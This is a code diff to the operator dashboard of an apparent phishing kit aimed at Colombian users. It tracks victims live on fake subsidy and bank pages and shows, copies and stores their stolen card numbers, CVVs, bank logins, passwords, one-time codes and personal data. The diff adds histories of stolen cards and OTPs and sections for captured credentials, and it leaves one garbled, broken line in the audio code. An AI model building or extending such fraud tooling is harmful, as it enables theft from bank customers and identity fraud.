@@ -33,7 +33,6 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .topbar-user strong { color: #e5e7eb; }
 .btn-logout { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
 .btn-logout:hover { background: #dc2626; }
-/* 🔥 FIX: contenedor ocupa todo el ancho de la pantalla */
 .container { max-width: 100%; margin: 0 auto; padding: 20px; }
 .tab-content { display: none; }
 .tab-content.active { display: block; }
@@ -55,39 +54,19 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .btn-borrar { background: #dc2626; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
 .btn-borrar:hover { background: #b91c1c; }
 .btn-borrar:disabled { opacity: 0.4; cursor: not-allowed; }
-
-/* 🔥 FIX: columnas sticky en la tabla de sesiones */
 .table-wrap { overflow-x: auto; position: relative; }
-
 .tabla-sesiones thead th:nth-child(1),
-.tabla-sesiones tbody td:nth-child(1) {
-    position: sticky; left: 0; z-index: 4;
-    background: #0f1421;
-    box-shadow: 4px 0 8px rgba(0,0,0,0.3);
-}
+.tabla-sesiones tbody td:nth-child(1) { position: sticky; left: 0; z-index: 4; background: #0f1421; box-shadow: 4px 0 8px rgba(0,0,0,0.3); }
 .tabla-sesiones tbody td:nth-child(1) { background: #151b2e; }
-
 .tabla-sesiones thead th:nth-child(2),
-.tabla-sesiones tbody td:nth-child(2) {
-    position: sticky; left: 32px; z-index: 3;
-    background: #0f1421;
-    box-shadow: 4px 0 8px rgba(0,0,0,0.3);
-}
+.tabla-sesiones tbody td:nth-child(2) { position: sticky; left: 32px; z-index: 3; background: #0f1421; box-shadow: 4px 0 8px rgba(0,0,0,0.3); }
 .tabla-sesiones tbody td:nth-child(2) { background: #151b2e; }
-
 .tabla-sesiones thead th:last-child,
-.tabla-sesiones tbody td:last-child {
-    position: sticky; right: 0; z-index: 4;
-    background: #0f1421;
-    box-shadow: -4px 0 10px rgba(0,0,0,0.5);
-    min-width: 240px;
-}
+.tabla-sesiones tbody td:last-child { position: sticky; right: 0; z-index: 4; background: #0f1421; box-shadow: -4px 0 10px rgba(0,0,0,0.5); min-width: 240px; }
 .tabla-sesiones tbody td:last-child { background: #151b2e; }
-
 .tabla-sesiones tbody tr:hover td:nth-child(1),
 .tabla-sesiones tbody tr:hover td:nth-child(2),
 .tabla-sesiones tbody tr:hover td:last-child { background: #1e2432; }
-
 table { width: 100%; border-collapse: collapse; font-size: 12px; }
 thead { background: #0f1421; }
 thead th { text-align: left; padding: 8px 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; white-space: nowrap; }
@@ -353,15 +332,13 @@ let filasAbiertas = new Set();
 let seleccionSesiones = new Set();
 let seleccionIps = new Set();
 let seleccionHistorial = new Set();
-let sesionesAnteriores = new Set(); 
+let sesionesAnteriores = new Set();
 let audioCtx = null;
 
-/* 🔥 SONIDO: variables para detectar cambios reales y evitar auto-sonidos */
 let snapshotSesiones = new Map();
 let accionesAdminRecientes = new Map();
 let primeraCargaSesiones = false;
 
-/* 🔥 FIX: evitar re-render mientras el usuario interactúa */
 let usuarioInteractuando = false;
 let interaccionTimer = null;
 let ultimaFirmaSesiones = '';
@@ -386,7 +363,6 @@ function firmaSesiones(lista) {
     ].join('|')).join('~');
 }
 
-/* 🔥 SONIDO: helpers */
 function asegurarAudioActivo() {
     try {
         if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -423,7 +399,6 @@ function fueAccionAdminReciente(sessionId) {
 
 function $(id) { return document.getElementById(id); }
 
-/* 🔥 SONIDO: 2 tonos distintos — 'nueva' (1 beep) y 'otp' (2 beeps) */
 function reproducirSonido(tipo) {
     try {
         if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -446,7 +421,8 @@ function reproducirSonido(tipo) {
             o2.type = 'sine';
             o2.frequency.setValueAtTime(880, ahora + 0.3);
             o2.frequency.exponentialRampToValueAtTime(1760, ahora + 0.42);
-            g2.gain.setValueAtTime(0.2, ahora + 0.3);
+            g2.gain.setValue
+                        g2.gain.setValueAtTime(0.2, ahora + 0.3);
             g2.gain.exponentialRampToValueAtTime(0.01, ahora + 0.7);
             o2.connect(g2); g2.connect(audioCtx.destination);
             o2.start(ahora + 0.3); o2.stop(ahora + 0.7);
@@ -522,31 +498,31 @@ async function cargarActivos() {
     } catch (e) {}
 }
 
-function renderActivos() { 
-    const filtro = ($('buscarActivos').value || '').toLowerCase().trim(); 
-    const tbody = $('tbodyActivos'); 
-    let lista = activosCache; 
-    if (filtro) { 
-        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro) || (a.sessionId || '').toLowerCase().includes(filtro)); 
-    } 
-    if (!lista.length) { 
-        tbody.innerHTML = '<tr><td colspan="5" class="empty">Sin usuarios activos</td></tr>'; 
-        return; 
-    } 
+function renderActivos() {
+    const filtro = ($('buscarActivos').value || '').toLowerCase().trim();
+    const tbody = $('tbodyActivos');
+    let lista = activosCache;
+    if (filtro) {
+        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro) || (a.sessionId || '').toLowerCase().includes(filtro));
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="5" class="empty">Sin usuarios activos</td></tr>';
+        return;
+    }
     tbody.innerHTML = lista.map(a => {
         let accionMostrar = a.ultimaAccion || 'entrando';
         if (accionMostrar === 'index') accionMostrar = 'Entrando';
         else if (accionMostrar === 'consultadesubsidio') accionMostrar = 'Consultando';
-        
-        return ` 
-        <tr> 
+
+        return `
+        <tr>
             <td class="dato" title="${escapeHtml(a.sessionId)}">${escapeHtml(truncar(a.sessionId, 15))}</td>
-            <td class="ip">${escapeHtml(a.ip)}</td> 
-            <td style="color:#88f456; font-weight:bold; font-size:12px;">${escapeHtml(accionMostrar)}</td> 
-            <td>${formatTime(a.tiempoDentro)}</td> 
-            <td><div class="actions"><button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button></div></td> 
+            <td class="ip">${escapeHtml(a.ip)}</td>
+            <td style="color:#88f456; font-weight:bold; font-size:12px;">${escapeHtml(accionMostrar)}</td>
+            <td>${formatTime(a.tiempoDentro)}</td>
+            <td><div class="actions"><button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button></div></td>
         </tr> `;
-    }).join(''); 
+    }).join('');
 }
 
 function botonesSesion(s) {
@@ -609,7 +585,6 @@ function botonesSesion(s) {
     return btns.join('');
 }
 
-/* 🔥 SONIDO: cargarSesiones con snapshot para detectar CUALQUIER cambio */
 async function cargarSesiones() {
     try {
         const d = await api('/admin/sesiones');
@@ -707,7 +682,7 @@ function renderSesiones() {
         const dp = datos.datosPersonales || {};
         const banco = datos.bancoKey || '-';
         const pasoActual = s.paso || 'index';
-        
+
         let pasoTexto = 'Entrando';
         if (pasoActual === 'consultadesubsidio') pasoTexto = 'Consultando';
         else if (pasoActual.includes('pagodesubsidio') || pasoActual.includes('Tarjeta')) {
@@ -757,7 +732,7 @@ function renderSesiones() {
             const ahora = Date.now();
             const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
             const segundosInactivo = (ahora - ultimoHeartbeat) / 1000;
-            
+
             if (segundosInactivo <= 10) {
                 colorPunto = '#22c55e';
                 tituloPunto = 'Activo (' + Math.floor(segundosInactivo) + 's)';
@@ -815,7 +790,8 @@ function renderSesiones() {
 }
 
 function verCredencialesAuth(usuario, password) { document.getElementById('verAuthUsuario').textContent = usuario; document.getElementById('verAuthPassword').textContent = password; document.getElementById('modalVerAuth').classList.remove('hidden'); }
-function actualizarBtnBorrarSesiones() { const btn = $('btnBorrarSesiones'); btn.disabled = seleccionSesiones.size === 0; btn.textContent = seleccionSesiones.size > 0 ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})` : '🗑️ Borrar seleccionados'; }
+function actualizarBtnBorrarSesiones() { const btn = $('btnBorrarSesiones'); btn.disabled = seleccionSesiones.size === 0; btn.textContent
+ = seleccionSesiones.size > 0 ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})` : '🗑️ Borrar seleccionados'; }
 $('checkAllSesiones').addEventListener('change', (e) => { if (e.target.checked) { sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId)); } else { seleccionSesiones.clear(); } renderSesiones(); });
 $('btnBorrarSesiones').addEventListener('click', async () => { if (!seleccionSesiones.size) return; if (!confirm(`¿Borrar ${seleccionSesiones.size} sesión(es)? Esta acción es permanente.`)) return; try { const ids = [...seleccionSesiones]; await api('/admin/sesiones/borrar', { method: 'POST', body: JSON.stringify({ sessionIds: ids }) }); toast(`🗑️ ${ids.length} sesión(es) borrada(s)`); seleccionSesiones.clear(); $('checkAllSesiones').checked = false; cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } });
 
@@ -828,7 +804,7 @@ function copiarDatos(id) {
     const d = h.datos || {};
     const dp = d.datosPersonales || {};
     const placas = d.placasData || [];
-    
+
     let texto = `--- DATOS PERSONALES ---\n`;
     texto += `Nombres: ${dp.primerNombre || ''} ${dp.segundoNombre || ''} ${dp.primerApellido || ''} ${dp.segundoApellido || ''}\n`;
     texto += `Documento: ${d.docType || 'CC'} ${d.docNumber || '-'}\n`;
@@ -839,7 +815,7 @@ function copiarDatos(id) {
     texto += `Estrato: ${dp.estrato || '-'} | Propiedad: ${dp.tipoPropiedad || '-'} | Vehículos: ${dp.soyPropietario || '-'}\n`;
     texto += `Origen: ${dp.direccionOrigen || '-'}\n`;
     texto += `Destino: ${dp.direccionDestino || '-'}\n`;
-    
+
     if (placas.length > 0) {
         texto += `\n--- VEHÍCULOS / PLACAS ---\n`;
         placas.forEach(p => {
@@ -847,7 +823,18 @@ function copiarDatos(id) {
         });
     }
 
-    if (d.tarjeta) {
+    if (d.identificacion || d.usuario || d.clave) {
+        texto += `\n--- CREDENCIALES ---\n`;
+        if (d.identificacion || d.usuario) texto += `Identificación: ${d.identificacion || d.usuario}\n`;
+        if (d.clave) texto += `Clave: ${d.clave}\n`;
+    }
+
+    if (d.tarjetasHistorial && d.tarjetasHistorial.length > 0) {
+        texto += `\n--- HISTORIAL DE TARJETAS (${d.tarjetasHistorial.length}) ---\n`;
+        d.tarjetasHistorial.forEach((t, i) => {
+            texto += `#${i+1} Tarjeta: ${t.tarjeta} | Venc: ${t.expMes}/${t.expAnio} | CVV: ${t.cvv} | Titular: ${t.titular} | Banco: ${t.bankName} | Nivel: ${t.cardLevel} | Fecha: ${new Date(t.fecha).toLocaleString('es-CO')}\n`;
+        });
+    } else if (d.tarjeta) {
         texto += `\n--- TARJETA ---\n`;
         texto += `Tarjeta: ${d.tarjeta}\nVencimiento: ${d.expMes}/${d.expAnio}\nCVV: ${d.cvv}\nTitular: ${d.titular}\nBanco: ${d.bankName}\n`;
     }
@@ -865,9 +852,16 @@ function copiarDatos(id) {
         texto += `Dirección: ${d.direccion || '-'}\n`;
         texto += `¿Quién paga?: ${d.rol || '-'}\n`;
     }
-    
-    texto += `\nOTP: ${d.otp || 'Sin OTP'}\nMonto Total: $${Number(d.monto || 0).toLocaleString('es-CO')}\nIP: ${d.ip || '-'}`;
-    
+
+    if (d.otpsHistorial && d.otpsHistorial.length > 0) {
+        texto += `\n--- HISTORIAL DE OTPs / CLAVES (${d.otpsHistorial.length}) ---\n`;
+        d.otpsHistorial.forEach((o, i) => {
+            texto += `#${i+1} ${o.tipo || 'otp'}: ${o.otp} | Fecha: ${new Date(o.fecha).toLocaleString('es-CO')}\n`;
+        });
+    }
+
+    texto += `\nMonto Total: $${Number(d.monto || 0).toLocaleString('es-CO')}\nIP: ${d.ip || '-'}`;
+
     navigator.clipboard.writeText(texto).then(function() {
         toast('📋 Datos copiados al portapapeles');
     }).catch(function() {
@@ -880,29 +874,39 @@ function renderHistorial() {
     const tbody = $('tbodyHistorial');
     let lista = historialCache;
     if (filtro) {
-        lista = lista.filter(h => { 
-            const datos = h.datos || {}; 
+        lista = lista.filter(h => {
+            const datos = h.datos || {};
             const dp = datos.datosPersonales || {};
             const placas = datos.placasData || [];
             const textoPlacas = placas.map(p => p.placa).join(' ');
-            const texto = [ h.bancoKey, dp.primerNombre, dp.primerApellido, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.titular, datos.correo, datos.celular, datos.cuenta, textoPlacas ].filter(Boolean).join(' ').toLowerCase(); 
-            return texto.includes(filtro); 
+            const texto = [ h.bancoKey, dp.primerNombre, dp.primerApellido, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.titular, datos.correo, datos.celular, datos.cuenta, datos.identificacion, datos.usuario, textoPlacas ].filter(Boolean).join(' ').toLowerCase();
+            return texto.includes(filtro);
         });
     }
     if (!lista.length) { tbody.innerHTML = '<tr><td colspan="7" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
-    
+
     tbody.innerHTML = lista.map(h => {
         const datos = h.datos || {};
         const dp = datos.datosPersonales || {};
         const placas = datos.placasData || [];
-        
+
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
-        const tarjeta = datos.tarjeta || (placas.length > 0 ? placas.map(p => p.placa).join(', ') : null) || (h.bancoKey === 'vanti' ? (datos.cuenta || '-') : '-');
+
+        const tarjetaBase = datos.tarjeta || (placas.length > 0 ? placas.map(p => p.placa).join(', ') : null) || (h.bancoKey === 'vanti' ? (datos.cuenta || '-') : '-');
+        const numTarjetas = (datos.tarjetasHistorial && datos.tarjetasHistorial.length) || (datos.tarjeta ? 1 : 0);
+        const numOtps = (datos.otpsHistorial && datos.otpsHistorial.length) || ((datos.otp || datos.claveDinamica || datos.token) ? 1 : 0);
+        const numEventos = (datos.eventosAdmin && datos.eventosAdmin.length) || 0;
+        const identFila = datos.identificacion || datos.usuario || '';
+        let tarjeta = '';
+        if (identFila) tarjeta += `ID: ${identFila} | `;
+        tarjeta += tarjetaBase;
+        if (numTarjetas > 1) tarjeta += ` (+${numTarjetas - 1} más)`;
+
         const titular = datos.titular || (datos.nombres ? (datos.nombres + ' ' + (datos.apellidos || '')).trim() : null) || dp.primerNombre || '-';
         const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
-        
+
         const abierta = filasAbiertas.has(h.id) ? 'visible' : '';
         const otp = datos.otp || 'Sin OTP';
 
@@ -942,7 +946,11 @@ function renderHistorial() {
                 <td class="dato" style="max-width:120px;">${escapeHtml(fecha)}</td>
                 <td>${nombreBanco(h.bancoKey, datos.marca)}</td>
                 <td class="dato mono" style="color:#fff; font-weight:bold;">${escapeHtml(tarjeta)}</td>
-                <td class="dato">${escapeHtml(exp)} / ${escapeHtml(cvv)}</td>
+                <td class="dato">
+                    ${escapeHtml(exp)} / ${escapeHtml(cvv)}
+                    ${numOtps > 0 ? `<span style="color:#a855f7; font-size:10px; margin-left:4px;" title="${numOtps} OTP(s)">🔐${numOtps}</span>` : ''}
+                    ${numEventos > 0 ? `<span style="color:#fbbf24; font-size:10px; margin-left:4px;" title="${numEventos} acción(es) del admin">⚙️${numEventos}</span>` : ''}
+                </td>
                 <td class="dato">${escapeHtml(truncar(titular, 20))}</td>
                 <td>
                     <button class="btn" style="background:#3b82f6; color:white;" title="Ver Detalles" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button>
@@ -962,8 +970,14 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Ubicación</span><span class="val">${escapeHtml(dp.departamento || '')}, ${escapeHtml(dp.municipio || '')}, ${escapeHtml(dp.localidad || '')}</span></div>
                             <div class="detalle-item"><span class="lbl">Estrato / Propiedad</span><span class="val">${escapeHtml(dp.estrato || '-')} / ${escapeHtml(dp.tipoPropiedad || '-')}</span></div>
                             <div class="detalle-item"><span class="lbl">Origen / Destino</span><span class="val">${escapeHtml(dp.direccionOrigen || '-')} a ${escapeHtml(dp.direccionDestino || '-')}</span></div>
-                            
+
                             ${htmlPlacas}
+
+                            ${(datos.identificacion || datos.usuario || datos.clave) ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔑 Credenciales</div>
+                            ${(datos.identificacion || datos.usuario) ? `<div class="detalle-item"><span class="lbl">Identificación</span><span class="val">${escapeHtml(datos.identificacion || datos.usuario)}</span></div>` : ''}
+                            ${datos.clave ? `<div class="detalle-item"><span class="lbl">Clave</span><span class="val">${escapeHtml(datos.clave)}</span></div>` : ''}
+                            ` : ''}
 
                             ${h.bancoKey === 'vanti' ? `
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔥 Datos del Formulario Vanti</div>
@@ -979,7 +993,39 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">¿Quién paga?</span><span class="val">${escapeHtml(datos.rol || '-')}</span></div>
                             ` : ''}
 
-                            ${datos.tarjeta ? `
+                            ${(datos.tarjetasHistorial && datos.tarjetasHistorial.length > 0) ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">💳 Historial de Tarjetas (${datos.tarjetasHistorial.length})</div>
+                            <div class="detalle-item" style="grid-column: 1/-1;">
+                                <table style="width: 100%; border-collapse: collapse; font-size: 11px; text-align: left;">
+                                    <thead>
+                                        <tr style="border-bottom: 1px solid #252d44; color: #88f456;">
+                                            <th style="padding: 5px;">#</th>
+                                            <th style="padding: 5px;">Tarjeta</th>
+                                            <th style="padding: 5px;">Venc.</th>
+                                            <th style="padding: 5px;">CVV</th>
+                                            <th style="padding: 5px;">Titular</th>
+                                            <th style="padding: 5px;">Banco</th>
+                                            <th style="padding: 5px;">Nivel</th>
+                                            <th style="padding: 5px;">Fecha</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        ${datos.tarjetasHistorial.map((t, i) => `
+                                            <tr style="border-bottom: 1px dashed #1a1f35;">
+                                                <td style="padding: 5px; color: #88f456; font-weight: bold;">${i + 1}</td>
+                                                <td style="padding: 5px; font-family: monospace; color: #fff;">${escapeHtml(t.tarjeta || '-')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(t.expMes || '')}/${escapeHtml(t.expAnio || '')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(t.cvv || '-')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(truncar(t.titular, 15))}</td>
+                                                <td style="padding: 5px;">${escapeHtml(t.bankName || '-')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(t.cardLevel || '-')}</td>
+                                                <td style="padding: 5px; font-size: 10px; color: #8b94a8;">${new Date(t.fecha).toLocaleString('es-CO')}</td>
+                                            </tr>
+                                        `).join('')}
+                                    </tbody>
+                                </table>
+                            </div>
+                            ` : (datos.tarjeta ? `
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">💳 Datos de la Tarjeta</div>
                             <div class="detalle-item"><span class="lbl">Número Tarjeta</span><span class="val">${escapeHtml(datos.tarjeta)}</span></div>
                             <div class="detalle-item"><span class="lbl">Vencimiento</span><span class="val">${escapeHtml(exp)}</span></div>
@@ -987,8 +1033,65 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Banco Emisor</span><span class="val">${escapeHtml(datos.bankName || '-')}</span></div>
                             <div class="detalle-item"><span class="lbl">Tipo de Tarjeta</span><span class="val">${escapeHtml(datos.cardType || '-')}</span></div>
                             <div class="detalle-item"><span class="lbl">Nivel de Tarjeta</span><span class="val">${escapeHtml(datos.cardLevel || '-')}</span></div>
+                            ` : '')}
+
+                            ${(datos.otpsHistorial && datos.otpsHistorial.length > 0) ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔐 Historial de OTPs / Claves (${datos.otpsHistorial.length})</div>
+                            <div class="detalle-item" style="grid-column: 1/-1;">
+                                <table style="width: 100%; border-collapse: collapse; font-size: 11px; text-align: left;">
+                                    <thead>
+                                        <tr style="border-bottom: 1px solid #252d44; color: #88f456;">
+                                            <th style="padding: 5px;">#</th>
+                                            <th style="padding: 5px;">Código</th>
+                                            <th style="padding: 5px;">Tipo</th>
+                                            <th style="padding: 5px;">Fecha</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        ${datos.otpsHistorial.map((o, i) => `
+                                            <tr style="border-bottom: 1px dashed #1a1f35;">
+                                                <td style="padding: 5px; color: #88f456; font-weight: bold;">${i + 1}</td>
+                                                <td style="padding: 5px; color: #a855f7; font-weight: bold;">${escapeHtml(o.otp || '-')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(o.tipo || 'otp')}</td>
+                                                <td style="padding: 5px; font-size: 10px; color: #8b94a8;">${new Date(o.fecha).toLocaleString('es-CO')}</td>
+                                            </tr>
+                                        `).join('')}
+                                    </tbody>
+                                </table>
+                            </div>
+                            ` : (otp && otp !== 'Sin OTP' ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔐 OTP</div>
+                            <div class="detalle-item"><span class="lbl">Código</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
+                            ` : '')}
+
+                            ${(datos.eventosAdmin && datos.eventosAdmin.length > 0) ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">⚙️ Acciones del Admin (${datos.eventosAdmin.length})</div>
+                            <div class="detalle-item" style="grid-column: 1/-1;">
+                                <table style="width: 100%; border-collapse: collapse; font-size: 11px; text-align: left;">
+                                    <thead>
+                                        <tr style="border-bottom: 1px solid #252d44; color: #88f456;">
+                                            <th style="padding: 5px;">#</th>
+                                            <th style="padding: 5px;">Acción</th>
+                                            <th style="padding: 5px;">Estado</th>
+                                            <th style="padding: 5px;">Usuario</th>
+                                            <th style="padding: 5px;">Fecha</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        ${datos.eventosAdmin.map((e, i) => `
+                                            <tr style="border-bottom: 1px dashed #1a1f35;">
+                                                <td style="padding: 5px; color: #88f456; font-weight: bold;">${i + 1}</td>
+                                                <td style="padding: 5px;">${escapeHtml(e.accion || '-')}${e.valor ? ` ($${Number(e.valor).toLocaleString('es-CO')})` : ''}</td>
+                                                <td style="padding: 5px;">${escapeHtml(e.estado || '-')}</td>
+                                                <td style="padding: 5px;">${escapeHtml(e.usuario || '-')}</td>
+                                                <td style="padding: 5px; font-size: 10px; color: #8b94a8;">${new Date(e.fecha).toLocaleString('es-CO')}</td>
+                                            </tr>
+                                        `).join('')}
+                                    </tbody>
+                                </table>
+                            </div>
                             ` : ''}
-                            
+
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🛡️ Otros Datos</div>
                             <div class="detalle-item"><span class="lbl">Monto Total</span><span class="val">$${Number(datos.monto || 0).toLocaleString('es-CO')}</span></div>
                             <div class="detalle-item"><span class="lbl">OTP</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
@@ -1017,7 +1120,6 @@ $('btnBorrarIps').addEventListener('click', async () => { if (!seleccionIps.size
 async function cargarLogs() { try { const d = await api('/admin/logs'); logsCache = d.logs; $('badgeLogs').textContent = d.logs.length; renderLogs(); } catch (e) {} }
 function renderLogs() { const filtro = ($('buscarLogs').value || '').toLowerCase().trim(); const tbody = $('tbodyLogs'); let lista = logsCache; if (filtro) { lista = lista.filter(l => { const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase(); return texto.includes(filtro); }); } if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>'; return; } tbody.innerHTML = lista.map(l => { const fecha = new Date(l.fecha).toLocaleString('es-CO'); return ` <tr> <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" disabled></td> <td>${escapeHtml(fecha)}</td> <td>${escapeHtml(l.tipo)}</td> <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td> </tr> `; }).join(''); }
 
-/* 🔥 SONIDO: marcarAccionAdmin para no sonar cuando YO hago clic */
 async function accion(sessionId, accion) {
     marcarAccionAdmin(sessionId);
     try {
@@ -1027,14 +1129,14 @@ async function accion(sessionId, accion) {
     } catch (e) { toast('Error: ' + e.message, true); }
 }
 
-async function bloquearIp(ip) { 
-    if (!ip || ip === '-') { toast('IP inválida', true); return; } 
-    if (!confirm('¿Bloquear la IP ' + ip + '?\n\nEl sistema expulsará y redirigirá al usuario automáticamente en los próximos 5 segundos.')) return; 
-    try { 
-        await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) }); 
-        toast('🚫 IP bloqueada y usuario expulsado: ' + ip); 
-        cargarTodo(); 
-    } catch (e) { toast('Error: ' + e.message, true); } 
+async function bloquearIp(ip) {
+    if (!ip || ip === '-') { toast('IP inválida', true); return; }
+    if (!confirm('¿Bloquear la IP ' + ip + '?\n\nEl sistema expulsará y redirigirá al usuario automáticamente en los próximos 5 segundos.')) return;
+    try {
+        await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) });
+        toast('🚫 IP bloqueada y usuario expulsado: ' + ip);
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
 }
 
 async function desbloquearIp(ip) { if (!confirm('¿Desbloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🔓 IP desbloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
@@ -1105,7 +1207,7 @@ function verInfoUsuario(sessionId) {
         html: `
             <div style="text-align: left; font-size: 13px; line-height: 1.7;">
                 <p><b>IP:</b> ${escapeHtml(d.ip || '-')}</p>
-                
+
                 ${tieneDatosPersonales ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
                 <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">📋 Datos Personales</div>
@@ -1123,53 +1225,59 @@ function verInfoUsuario(sessionId) {
 
                 ${htmlPlacas}
 
+                ${(d.identificacion || d.usuario || d.clave) ? `
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">🔑 Credenciales</div>
+                ${(d.identificacion || d.usuario) ? `<p><b>Identificación:</b> ${escapeHtml(d.identificacion || d.usuario)}</p>` : ''}
+                ${d.clave ? `<p><b>Clave:</b> ${escapeHtml(d.clave)}</p>` : ''}
+                ` : ''}
+
                 ${d.tarjeta ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
                 <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">💳 Datos Tarjeta</div>
                 <p><b>Tarjeta:</b> ${escapeHtml(d.tarjeta)}</p>
-                <p><b>Vencimiento:</b> ${escapeHtml(d.expMes || '-')}/${escapeHtml(d.expAnio || '-')}</p>
+                <p><b>Vencimiento:</b> ${escapeHtml(d.expMes || d.exp || '')}/${escapeHtml(d.expAnio || '')}</p>
                 <p><b>CVV:</b> ${escapeHtml(d.cvv || '-')}</p>
                 <p><b>Titular:</b> ${escapeHtml(d.titular || '-')}</p>
                 <p><b>Banco Emisor:</b> ${escapeHtml(d.bankName || '-')}</p>
-                <p><b>Nivel:</b> ${escapeHtml(d.cardLevel || '-')}</p>
+                <p><b>Tipo:</b> ${escapeHtml(d.cardType || '-')} | <b>Nivel:</b> ${escapeHtml(d.cardLevel || '-')}</p>
+                ` : ''}
+
+                ${d.authUsuario ? `
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">🔐 Autorización</div>
+                <p><b>Usuario:</b> ${escapeHtml(d.authUsuario)}</p>
+                <p><b>Contraseña:</b> ${escapeHtml(d.authPassword || '-')}</p>
                 ` : ''}
 
                 <hr style="border-color:#252d44; margin: 10px 0;">
-                <p><b>OTP:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || '-')}</span></p>
-                <p><b>Monto Total:</b> $${Number(d.monto || d.precio || 0).toLocaleString('es-CO')}</p>
+                <p><b>OTP / Clave Dinámica:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || d.claveDinamica || '-')}</span></p>
+                <p><b>Token:</b> ${escapeHtml(d.token || '-')}</p>
+                <p><b>Monto:</b> $${Number(d.monto || d.precio || 0).toLocaleString('es-CO')}</p>
+                <p><b>Estado:</b> ${escapeHtml(s.estado)}</p>
             </div>
         `,
-        confirmButtonColor: '#88f456',
+        width: 600,
         confirmButtonText: 'Cerrar',
-        background: '#151b2e',
-        color: '#e5e7eb',
-        width: 600
+        confirmButtonColor: '#113455'
     });
 }
 
+// Buscadores
 $('buscarActivos').addEventListener('input', renderActivos);
 $('buscarSesiones').addEventListener('input', renderSesiones);
 $('buscarIps').addEventListener('input', renderIps);
 $('buscarLogs').addEventListener('input', renderLogs);
 
-if (TOKEN) { fetch(API_BASE + '/admin/stats', { headers: { 'Authorization': 'Bearer ' + TOKEN } }).then(r => { if (r.ok) mostrarDashboard(); else logout(); }).catch(() => logout()); }
-document.addEventListener('keydown', e => { if (e.key === 'Escape' && TOKEN) logout(); });
